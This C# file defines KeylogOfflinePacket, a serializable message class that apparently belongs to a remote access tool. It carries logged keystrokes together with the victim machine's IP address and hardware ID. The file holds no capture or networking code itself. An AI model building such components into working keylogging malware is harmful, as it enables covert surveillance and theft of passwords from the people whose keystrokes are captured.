﻿using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class KeylogOfflinePacket : IPacket
    {
        public KeylogOfflinePacket(string keyStroke, string baseIp, string HWID) : base()
        {
            this.packetType = PacketType.KEYLOG_OFFLINE;
            this.keyStroke = keyStroke;
            this.baseIp = baseIp;
            this.HWID = HWID;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string keyStroke { get; set; }
    }
}
